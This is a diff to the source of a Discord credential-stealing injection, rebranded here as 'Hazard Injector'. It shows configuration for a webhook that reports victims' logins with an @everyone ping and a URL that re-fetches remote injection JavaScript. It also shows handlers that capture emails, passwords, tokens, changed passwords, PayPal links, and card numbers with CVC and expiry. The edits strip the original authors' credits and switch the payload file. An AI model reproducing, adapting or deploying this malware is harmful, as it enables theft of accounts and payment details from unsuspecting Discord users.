@@ -12,9 +12,9 @@ const config = {
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Hazard-Injector', //name of the webhook thats gonna send the info
-  embed_icon: 'https://cdn.discordapp.com/attachments/1087214165078315079/1091219565255606292/2588y2y582h9tho32.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://cdn.discordapp.com/attachments/1087214165078315079/1091219565255606292/2588y2y582h9tho32.png?width=4000&height=4000', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16766720, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/BasedAndReal/KBUv.y2tKxuCx1jDA0fKZdxauoLu_jy1RuFc0cOk_MOOB.pAxkrPrOnyqwcLBw7ZpKbwf3dOrIOL1R.57EV-Hj4bZsuD1ezSveUK/main/auto_buy_true_injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/BasedAndReal/KBUv.y2tKxuCx1jDA0fKZdxauoLu_jy1RuFc0cOk_MOOB.pAxkrPrOnyqwcLBw7ZpKbwf3dOrIOL1R.57EV-Hj4bZsuD1ezSveUK/main/auto_buy_false_injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection by Rose Injector・https://github.com/DamagingRose/Rose-Injector',
+          text: '🎉・Discord Injection by Hazard Injector',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Discord Injection By Hazard Injector',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Discord Injection By Hazard Injector',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Discord Injection By Hazard Injector',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Discord Injection By Hazard Injector',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '🎉・Discord Injection By Hazard Injector',
         },
       },
     ],
